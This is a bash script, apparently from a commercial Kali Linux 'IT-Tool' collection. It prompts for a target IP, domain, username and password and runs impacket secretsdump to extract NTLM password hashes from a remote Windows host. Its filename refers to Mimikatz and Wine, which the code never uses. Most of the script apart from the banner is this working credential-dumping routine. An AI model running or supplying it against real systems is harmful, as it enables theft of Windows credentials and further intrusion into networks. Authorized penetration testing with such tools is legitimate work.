#!/usr/bin/env bash
# ==============================================================
# IT-Tool by SalgadoTech
# Script: 575.Extract_Hashes_Mimikatz_Wine.sh
# ScriptID: ST-LIN-0575
# Version: 1.0
# Date: 2026-07-01
# Category: Linux > Kali Linux > Password Tools
# Description: Extracts NTLM hashes from a remote Windows host using impacket secretsdump.
# (c) 2025 SalgadoTech - All Rights Reserved
# Unauthorized distribution prohibited
# ==============================================================

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo ""
echo -e '\033[0;36m\033[0m'
echo -e '\033[0;36m  _____ _____  _______ ____   ____  _\033[0m'
echo -e '\033[0;36m |_   _|_   _||__   __/ __ \ / __ \| |\033[0m'
echo -e '\033[0;36m   | |   | |     | | | |  | | |  | | |\033[0m'
echo -e '\033[0;36m   | |   | |     | | | |  | | |  | | |\033[0m'
echo -e '\033[0;36m  _| |_  | |     | | | |__| | |__| | |___\033[0m'
echo -e '\033[0;36m |_____| |_|     |_|  \____/ \____/|_____|\033[0m'
echo -e '\033[0;36m\033[0m'
echo -e '\033[0;37m  ==================================================================\033[0m'
echo -e '\033[0;36m  IT-Tool by SalgadoTech\033[0m'
echo -e '\033[0;36m  Script: 575.Extract_Hashes_Mimikatz_Wine.sh\033[0m'
echo -e '\033[0;36m  ScriptID: ST-LIN-0575\033[0m'
echo -e '\033[0;36m  Version: 1.0\033[0m'
echo -e '\033[0;36m  Date: 2026-07-01\033[0m'
echo -e '\033[0;36m  Category: Linux > Kali Linux > Password Tools\033[0m'
echo -e '\033[0;36m  Description: Extracts NTLM hashes from a remote Windows host using impacket secretsdump\033[0m'
echo -e '\033[0;36m  (c) 2025 SalgadoTech - All Rights Reserved\033[0m'
echo -e '\033[0;36m  Unauthorized distribution prohibited\033[0m'
echo -e '\033[0;37m  ==================================================================\033[0m'
echo ""

read -rp "  Target IP: " ip
read -rp "  Domain (or . for local): " dom
read -rp "  Username: " u
read -rp "  Password: " p

if [ -z "$ip" ] || [ -z "$dom" ] || [ -z "$u" ]; then
    echo -e "${RED}  ERROR: Target IP, domain and username cannot be empty.${NC}"
    echo ""
    read -rp "Press Enter to exit..." _
    exit 1
fi

echo ""
echo -e "${YELLOW}  Extracting hashes from '$ip'...${NC}"
if command -v impacket-secretsdump &>/dev/null; then
    impacket-secretsdump "$dom/$u:$p@$ip"
else
    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py "$dom/$u:$p@$ip"
fi

if [ $? -eq 0 ]; then
    echo -e "${GREEN}  SUCCESS: Hash extraction from '$ip' completed.${NC}"
else
    echo -e "${RED}  ERROR: Hash extraction from '$ip' failed.${NC}"
fi

echo ""
read -rp "Press Enter to exit..." _
